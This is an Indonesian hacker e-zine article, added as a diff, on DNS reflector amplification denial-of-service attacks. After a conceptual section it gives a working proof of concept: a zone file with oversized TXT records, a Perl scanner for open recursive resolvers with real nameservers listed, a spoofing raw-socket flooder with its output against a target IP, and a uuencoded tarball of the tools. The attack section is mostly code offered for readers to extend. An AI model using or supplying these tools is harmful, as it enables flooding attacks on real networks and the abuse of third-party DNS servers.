@@ -1,0 +1,561 @@
+k Elektronik Indonesia [ KEI ]
+http://www.kecoak-elektronik.net
+
+24 Hours A Day, 300/1200 Baud
+Presents...
+
+
+####################################################################
+TOKET - Terbitan Online Kecoak Elektronik
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak-elektronik.net
+Contact   : staff@kecoak-elektronik.net
+####################################################################
+
+
+Subject   : DNS Reflector Amplification Attack
+Writer    : Straw Hat Pirates of BytesKrew
+Contact   : Straw Hat Pirates Can't Be Contacted
+Style     : Unicode Transformation Format (UTF-8)
+
+
+
+--[1]-- Kecoak Elektronik License
+
+Kecoak Elektronik secara aktif mendukung Blue Ribbon Campaign.
+Kami akan berusaha untuk menerbitkan semua informasi yang kami anggap
+patut diketahui, baik dokumen teks, artikel majalah, atau surat kabar.
+Seluruh kredit akan diberikan kepada sang pengarang.
+
+Kecoak Elektronik tidak bertanggung jawab atas tindakan orang lain.
+Informasi yang disajikan di situs ini adalah untuk tujuan pendidikan
+dan informasionil belaka. Jika anda memutuskan untuk mengejawantahkan
+dalam bentuk apapun informasi yang tersimpan di situs ini, anda
+melakukan atas keputusan sendiri, dan tidak seorangpun selain anda
+bertanggung jawab atas tindakan tersebut.
+
+Dipersilahkan untuk mengambil sebagian atau seluruh dari isi artikel
+yang kami terbitkan dengan tetap mencantumkan kredit atas pengarang
+dan Kecoak Elektronik sebagai penerbit online. Artikel yang dikutip
+atau diambil tidak dapat dipergunakan untuk kepentingan komersil.
+
+
+--[2]-- Introduction
+
+Tema tentang DNS sedang sangat hangat untuk diangkat di berbagai
+kalangan pemerhati security maupun insecurity. Sebuah cacat pada
+implementasi DNS yang ditemukan Dan Kaminsky cukup menghebohkan dunia
+perinternetan. Sebuah artikel yang menjelaskan tentang bagaimana proses
+exploitasi bugs tersebut sudah dirilis secara lengkap oleh salah satu
+staff kecoak elektronik (Cyb3rh3b) di ezine echo beberapa waktu lalu.
+Lalu apalagi DNS reflector amplication attack??
+
+Sebuah insiden denial of service mengenai pemanfaatan DNS sebagai
+reflektor sekaligus penguat serangan telah ramai dibahas lebih dari 2 tahun
+lalu. Tetapi banyak script kiddie yang hanya mengerti bagaimana melakukan 
+serangan DoS menggunakan tembak.c atau terjebak dengan fake UDP flooder
+f-udp.tgz yang mengirimkan shadow password ke authornya? who cares dude! 
+Serangan denial of service dengan pemanfaatan DNS sebagai penguat serangan 
+sering dikenal dengan distributed reflection denial of service (DrDoS).
+
+
+--[3]-- Konsep DNS Amplication Attack.
+
+Konsep pengimplementasian DNS saya ambil dari RFC 1035 [i]. Pembahasan
+konsep tidak dilakukan secara mendetail tetapi hanya pada bagian terkait
+dengan bagaimana DNS menjadi penguat DoS. Untuk keperluan penguat
+DoS dibutuhkan DNS server yang mensupport recursive query. Untuk mencari
+sebuah DNS server mensupport recurisve query atau tidak, kita bisa
+melakukannya dengan melakukan pengecekan pada header paket DNS. Jika
+pada header paket DNS, flag Recursion Available (RA) bernilai 1 artinya 
+DNS mensupport recursive query. Gambar berikut menunjukkan header paket
+DNS.
+
+                                    1  1  1  1  1  1
+      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
+    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+    |                      ID                       |
+    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+    |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
+    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+    |                    QDCOUNT                    |
+    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+    |                    ANCOUNT                    |
+    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+    |                    NSCOUNT                    |
+    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+    |                    ARCOUNT                    |
+    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+
+
+Jika sebuah nameserver mensupport recursion query maka RA akan bernilai
+1. Pengimplementasian dalam bahasa pemrograman cukup dengan menggunakan
+struktur data. Contoh dalam bahasa pemrograman perl anda bisa melihat
+file di <PERLLIBRARY>/Net/DNS/Header.pm.
+
+Pertanyaan selanjutnya adalah, bagaimana sebuah recursive DNS server
+bisa menjadi penguat DoS. Saya mengacu pada paper yang di publish oleh
+verisign tentang insiden pada tahun 2006 lalu [ii]. Proses DoS
+dilakukan dengan flow diagram seperti pada gambar berikut :
+
+
+......................|attacker|---->|zombie|------------| send query
+....................../..................................| spoofed source
+...................../ break-in..........................| from victim
+..................../....................................V
+.................../............................|--------------------|
+...|  compromised |.............................| Open dan Recursive |
+...|   beberapa   |<----------------------------| name server 30 ribu|
+...|  name server | query sekali,trus di cache  | sampai 500 ribu    |
+................................................|--------------------|
+....publish big TXT				  	  ||
+.................................................Flooding ||
+..........................................................||
+..........................................................VV
+......................................................| victim |
+
+
+Pada gambar tersebut seorang attacker mengkompromise sebuah name server 
+yang digunakan untuk mempublish TXT record sebuah domain dalam ukuran 
+besar. Attacker mengoleksi cukup banyak open recursive DNS server yakni 
+sekitar 30 ribu sampai 500 ribu server. Pada kejadian tahun 2006 lalu
+ukuran TXT yang digunakan adalah 4028 bytes ~ 4 KB. Ukuran paket DNS
+pada umumnya adalah sekitar 60 bytes - 70 bytes. Sehingga terjadi
+penguatan flooding sebesar 4028:64 atau sekitar 63:1. Ketika sebuah 
+recursive DNS server menerima request untuk memperoleh record TXT dari
+sebuah domain, maka recursive DNS server itu akan merequest sekali 
+ke authoritive name server pemegang record TXT terkait. Setelah itu
+record tersebut di cache di recursive DNS server tadi. Request
+dikirim berasal dari alamat IP yang di spoof dari alamat victim,
+sehingga reply dikirimkan oleh recursive DNS server ke victim. Jika
+terdapat 10000 saja recursive DNS server, maka victim akan menerima
+paket hampir 40 MB. Selanjutnya attacker mengulangi lagi request dengan
+pola tersebut. Karena recursive DNS server sudah melakukan caching pada
+record TXT tadi, maka recursive DNS server tersebut tidak perlu
+meneruskan query tersebut ke authoritive name server tetapi cukup
+menggunakan data yang ada di cachenya untuk memberi reply request
+tersebut ke victim. Hal ini terjadi terus-menerus sehingga koneksi
+victim dipenuhi oleh paket sampah yang dikenal dengan flooding.
+
+Proses DNS amplication attack sendiri tidak hanya terbatas menggunakan
+TXT records tetapi bisa menggunakan records yang lain. Sebuah proof of
+concept DNS amplication attack menggunakan A records sudah tersebar ke
+publik. Walaupun proses penguatan menggunakan A records pada umumnya
+tidak sebesar penguatan menggunakan TXT records, tetapi penggunaan A
+records cenderung lebih mudah dengan memanfaatkan DNS server yang
+memiliki A records cukup banyak tanpa harus melakukan compromised.
+
+
+......................|attacker|---->|zombie|------------| send query
+.........................................................| spoofed source
+.........................................................| from victim
+.........................................................V
+................................................|--------------------|
+...|   beberapa   |.............................| Open dan Recursive |
+...| name server  |<----------------------------| name server 30 ribu|
+...|big A records | query sekali,trus di cache  | sampai 500 ribu    |
+................................................|--------------------|
+..........................................................||
+.................................................Flooding ||
+..........................................................||
+..........................................................VV
+......................................................| victim |
+
+
+--[4]-- Proof of Concept
+
+Dari konsep sederhana di atas, mari kita turunkan sebuah proof of
+concept. Walaupun tidak sulit tetapi tidak sesederhana menggunakan
+tembak.c atau f-udp.tgz. Pertama seorang attacker harus mempunyai sebuah
+nameserver yang digunakan sebagai authoritive nameserver untuk mengenerate 
+TXT record. Misal seorang attacker berhasil mengkompromise ns1.test.edu.
+Pada ns1.test.edu DNS server menggunakan BIND DNS dengan salah satu zone
+pada file named.conf sebagai berikut:
+
+zone "test.edu" IN {
+        type master;
+        file "/var/named/net/data.test.edu";
+};
+
+
+kemudian attacker menambahkan sebuah record TXT pada
+/var/named/net/data.test.edu sepanjang 4000 bytes.
+
+
+@ IN SOA dns.test.edu. admin.test.edu. (
+                200022710 ; Serial
+                28800 ; Refresh
+                14400 ; Retry
+                3600000 ; Expire
+                86400 ) ; Minimum
+
+$TTL 86400
+@       IN      NS      ns1.test.edu.
+mail    IN      A       18.7.22.83
+proxy   IN      A       18.7.22.84
+info    IN      A       18.7.22.85
+test	IN	TXT	xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+test	IN	TXT	yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
+test	IN	TXT	zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
+test	IN	TXT	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+test	IN	TXT	bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb (dst 4000 bytes)
+
+
+Setelah mempublish record TXT tersebut, attacker kemudian mencoba
+melihat apakah record tersebut sudah terbaca dari internet.
+
+root@eleet~>dig test.test.edu TXT
+;; Truncated, retrying in TCP mode.
+
+; <<>> DiG 9.3.4-P1.1 <<>> @ns1.test.edu test.test.edu TXT
+; (1 server found)
+;; global options:  printcmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 22127
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;test.test.edu.                        IN      TXT
+;; ANSWER SECTION:
+test.test.edu.   86400   IN   TXT xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+test.test.edu.	 86400   IN   TXT yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
+test.test.edu.   86400   IN   TXT zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
+test.test.edu.   86400   IN   TXT aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+test.test.edu.	 86400	 IN   TXT bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb (dst 4000 bytes)
+;; AUTHORITY SECTION:
+test.edu.              86400   IN      NS      ns1.test.edu.
+
+;; Query time: 6 msec
+;; SERVER: 202.124.20.2#53(202.124.20.2)
+;; WHEN: Tue Aug 19 22:05:56 2008
+;; MSG SIZE  rcvd: 4004
+
+root@eleet~>echo Size:`dig test.test.edu TXT \
+> |grep SIZE|awk -F : '{print $2}'` bytes
+Size: 4004 bytes
+root@eleet~>
+
+Penggunaan sebuah TXT records tidak efektif karena dengan menggunakan 
+sebuah records saja maka DNS pemegang authority TXT records 
+tersebut akan terflooding. Untuk itu perlu mengkompromise beberapa DNS 
+server untuk mempublish beberapa "big TXT records". Sebuah contoh TXT 
+records yang pernah kami gunakan sebesar 2000 bytes adalah
+hacked.trango.nl. Secara teoritis penguatan serangan menggunakan 2000
+bytes sekitar 2000:64 ~ 31:1 tetapi saat saya melakukan pengujian saya
+hanya mendapatkan penguatan sekitar 5:1. What the hell?!
+
+Proses pembuatan TXT records dengan mengkompromise beberapa DNS server
+bisa memberikan kesulitan tersendiri sehingga pemanfaatan A records
+untuk penguat serangan menjadi pilihan tersendiri. Untuk keperluan
+penguat serangan DoS gunakan domain yang memiliki banyak A records
+misalnya irc.efnet.net, irc.freenode.net, ui.ac.id.   
+
+Setelah menyiapkan TXT atau A records, selanjutnya attacker harus 
+mencari open dns server yang mengizinkan recursive query. Pencarian 
+bisa dilakukan dengan menggunakan bantuan script perl sederhana 
+berikut ini :
+
+root@eleet~>cat find-dns.pl
+#!/usr/bin/perl
+#Simple Open Recursive DNS Finder
+#Create a list DNS nameserver in a file, then save with file name ns.txt
+#This is just Release Candidate version
+#Try to add threading or forking to be more reliable and faster.
+
+use Net::DNS;
+use strict;
+use POSIX;
+my @ns;
+my $i;
+
+my $thost="milw0rm.com";
+
+open(NS,"<ns.txt");
+chop(@ns=<NS>);
+for($i=0;$i<=$#ns;$i++){
+  my @nameserver = ($ns[$i]);
+  my $r = Net::DNS::Resolver->new(
+	nameservers => [@nameserver],
+	debug => 0,
+	udp_timeout => 3,
+	tcp_timeout => 3,
+  );
+  my $packet = Net::DNS::Packet->new($thost,'A','IN');
+  my $answer = $r->send($packet);
+  print "Using nameserver ".$ns[$i]."\n";
+  if($r->errorstring =~ m/NOERROR/){
+    #RFC 1035
+    if($answer->header->ra==1){
+      print $ns[$i]. " allows recursive query\n";
+      open(RNS,">>recursive-ns.txt");
+      print RNS $ns[$i]."\n";
+    }
+  }
+}
+root@eleet~>
+
+Penggunaan script di atas membutuhkan file ns.txt yang harus disusun
+baik secara manual maupun otomatis tergantung ke kreatifan pengguna.
+Salah satu cara menyusun file ns.txt yang saya tawarkan adalah dengan
+menggunakan script bash sederhana berikut ini.
+
+root@eleet~>cat getns.sh
+#!/bin/sh
+if [ -z "$1" ];
+then
+  echo "usage : $0 <host>"
+  exit;
+else
+ HOST=$1
+ LEN=$(host -a $HOST|grep ^$HOST|grep NS|wc -l)
+ COUNT=$(($LEN/2))
+ host -a $HOST|grep ^$HOST|grep NS|head -$COUNT|awk '{print $5}' >> ns.txt
+fi;
+#EOF
+root@eleet~>chmod +x getns.sh
+root@eleet~>./getns.sh kandangjamur.net
+root@eleet~>./getns.sh ui.ac.id
+root@eleet~>./getns.sh itb.ac.id
+root@eleet~>./getns.sh yahoo.com
+root@eleet~>./getns.sh google.com
+root@eleet~>./getns.sh jasakom.com
+root@eleet~>cat ns.txt
+ns1.idwebhost.com.
+ns2.idwebhost.com.
+ns4.idwebhost.com.
+uicsgtw.cs.ui.ac.id.
+haur.ui.ac.id.
+ns3.padinet.com.
+ns1.itb.ac.id.
+ns1.yahoo.com.
+ns5.yahoo.com.
+ns6.yahoo.com.
+ns4.yahoo.com.
+ns3.yahoo.com.
+ns2.yahoo.com.
+ns8.yahoo.com.
+ns1.google.com.
+ns2.google.com.
+ns3.google.com.
+ns4.google.com.
+ns2.itb.ac.id.
+ns1.itb.ac.id.
+ns3.itb.ac.id.
+dns010.d.register.com.
+dns068.b.register.com.
+dns131.a.register.com.
+dns012.c.register.com.
+root@eleet~>
+
+Ada yang kurang efektifkan dari script getns.sh?? hehe masih ada silakan
+gunakan kreatifitas agar getns.sh mengambil nameserver dari domain yang
+di input automatic misalnya dengan grab nama domain lewat google. Untuk
+codenya that's ur fucking job! Selanjutnya adalah mengeksekusi script
+find-dns.pl untuk memperoleh nameserver mana saja yang open dan
+recursive.
+
+root@eleet~>chmod +x find-dns.pl
+root@eleet~>./find-dns.pl
+Using nameserver ns1.idwebhost.com.
+ns1.idwebhost.com. allows recursive query
+Using nameserver ns2.idwebhost.com.
+Using nameserver ns4.idwebhost.com.
+Using nameserver uicsgtw.cs.ui.ac.id.
+uicsgtw.cs.ui.ac.id. allows recursive query
+Using nameserver haur.ui.ac.id.
+Using nameserver ns3.padinet.com.
+ns3.padinet.com. allows recursive query
+Using nameserver ns1.itb.ac.id.
+Using nameserver ns1.yahoo.com.
+Using nameserver ns5.yahoo.com.
+Using nameserver ns6.yahoo.com.
+Using nameserver ns4.yahoo.com.
+Using nameserver ns3.yahoo.com.
+Using nameserver ns2.yahoo.com.
+Using nameserver ns8.yahoo.com.
+Using nameserver ns1.google.com.
+Using nameserver ns2.google.com.
+Using nameserver ns3.google.com.
+Using nameserver ns4.google.com.
+Using nameserver ns2.itb.ac.id.
+Using nameserver ns1.itb.ac.id.
+Using nameserver ns3.itb.ac.id.
+Using nameserver dns010.d.register.com.
+Using nameserver dns068.b.register.com.
+Using nameserver dns131.a.register.com.
+Using nameserver dns012.c.register.com.
+root@eleet~>cat recursive-ns.txt
+ns1.idwebhost.com.
+uicsgtw.cs.ui.ac.id.
+ns3.padinet.com.
+root@eleet~>
+
+Setelah TXT atau A records disiapkan, open recursive DNS server
+disiapkan, maka langkah terakhir adalah melakukan flooding ke target.
+Flooding bisa dilakukan dari single source atau multiple source
+tergantung attacker. Untuk flooding menggunakan A records silakan
+toolsnya di download sendiri di milw0rm http://milw0rm.com/exploits/4560
+sedangkan untuk TXT records silakan gunakan tools berikut yang merupakan
+modifikasi dari tools di milw0rm tadi. Sebelum menjalankan tools ini
+pastikan bahwa libpcap-devel sudah terinstall, Net::RawIP dan Net::DNS
+library juga sudah ada untuk perlnya.
+
+root@eleet~>yum install libpcap-devel
+--edited--
+root@eleet~>cpan Net::RawIP
+--edited--
+root@eleet~>cpan Net::DNS
+--edited--
+root@eleet~> cat TXT-flooder.pl
+#!/usr/bin/perl
+# DrDoS DNS Amplification based on http://www.verisign.com/static/037903.pdf 
+# This tools uses big TXT records to multiply attacking. This is just modifi
+# cation of tools created by Shadow which uses A records.
+# 
+
+use Net::DNS::Resolver;
+use Net::RawIP;
+use strict;
+
+my $nameservers;
+my @nameservers;
+my $str;
+my $src_ip;
+my $reflector;
+$src_ip = $ARGV[0];
+
+open(RNS,"<recursive-ns.txt");
+chop(@nameservers=<RNS>);
+my $len=@nameservers;
+my $reflectors=$len;
+
+if ($ARGV[0] eq '') { print "Usage: " . $0 . " <IP>\n"; exit(0); }
+print ("Hitting $ARGV[0]\n");
+
+for (my $i=0; $i < 256; $i++) {
+    # Make DNS packet
+    my $dnspacket = new Net::DNS::Packet($str, "TXT", "IN");
+    my $dnsdata = $dnspacket->data;
+    my $sock = new Net::RawIP({udp=>{}});
+    # send packet
+    $str = "hacked.example.nl";                            
+    $reflector = $nameservers[int rand($reflectors)];          # Select entry from @nameservers
+    $sock->set({ip => {
+                saddr => $src_ip, daddr => "$reflector", frag_off=>0,tos=>0,id=>1565},
+                udp => {source => 53,
+                dest => 53, data=>$dnsdata
+                } });
+    $sock->send;
+    print "Me -> " . $reflector . "(DNSing " . $str . ")" . " -> " . $src_ip . " \n"; 
+    $i = 0;
+}
+exit(0);
+root@eleet~>perl TXT-flooder.pl 202.155.2.123
+Hitting 202.155.2.123
+Me -> 208.67.222.222(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> 208.67.220.220(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> 208.67.220.220(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> 208.67.222.222(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> 208.67.220.220(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> 208.67.220.220(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> 208.67.222.222(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> 205.234.223.168(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> 205.234.223.168(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> ns3.padinet.com(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> ns3.padinet.com(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> 205.234.223.168(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> 208.67.222.222(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> ns3.padinet.com(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> 208.67.222.222(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> ns3.padinet.com(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> 205.234.223.168(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> 208.67.222.222(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> ns3.padinet.com(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> 208.67.222.222(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> ns3.padinet.com(DNSing hacked.trango.nl) -> 202.155.2.123 
+Me -> 208.67.222.222(DNSing hacked.trango.nl) -> 202.155.2.123 
+
+(dst)
+
+root@eleet~>
+
+Untuk memastikan bahwa target attacking sudah down, gunakan utility
+seperti ping untuk mengecek apakah host target masih bisa diakses atau
+tidak. Proses flooding diatas hanya menggunakan sebuah host dengan
+beberapa reflector. Akan lebih baik jika flooding dilakukan dari banyak
+host (zombie) dengan ratusan bahkan ribuan reflector. Tapi semua itu
+tugas anda bagaimana mengembangkan ide yang saya berikan.
+
+
+--[5]-- Penutup
+
+Tulisan yang dibuat disela-sela kesibukan StrawHat yang sudah bisa
+dipastikan ada kekurangannya. Tools yang di release semua masih release
+candidate karena memang stable versionnya tidak di develope. Tapi
+mudah-mudahan tulisan tersebut bisa menjadi pertimbangan para
+administrator jaringan sebelum memngizinkan DNS nya digunakan oleh
+publik. Finally, Open Your Eyes.....
+
+
+--[6]-- Referensi
+
+[i]	http://www.ietf.org/rfc/rfc1035.txt
+[ii]	http://www.verisign.com/static/037903.pdf
+
+
+--[7]-- Tools
+
+begin 644 dns-tools.tar.gz
+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
+0V,(6MO`MX'=$Z.XL`"@`````
+`
+end
